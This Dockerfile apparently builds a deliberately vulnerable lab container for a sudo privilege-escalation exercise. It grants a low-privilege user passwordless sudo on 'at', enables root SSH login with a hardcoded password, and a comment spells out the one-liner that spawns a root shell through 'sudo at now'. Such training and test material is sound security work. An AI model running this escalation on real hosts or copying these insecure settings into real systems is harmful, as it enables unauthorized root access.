FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_at
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/at as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and at
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        at \
        procps \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify at is installed
RUN which at && ls -la /usr/bin/at

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# at can schedule commands. When run as root via sudo, scheduled commands
# execute as root. The exploit:
#   echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
# This schedules a root shell to spawn immediately on the current terminal.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/at" > /etc/sudoers.d/at && \
    chmod 440 /etc/sudoers.d/at

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

# Ensure atd can run (needed for at to actually execute jobs)
# We start both atd and sshd
EXPOSE 22
CMD service atd start && /usr/sbin/sshd -D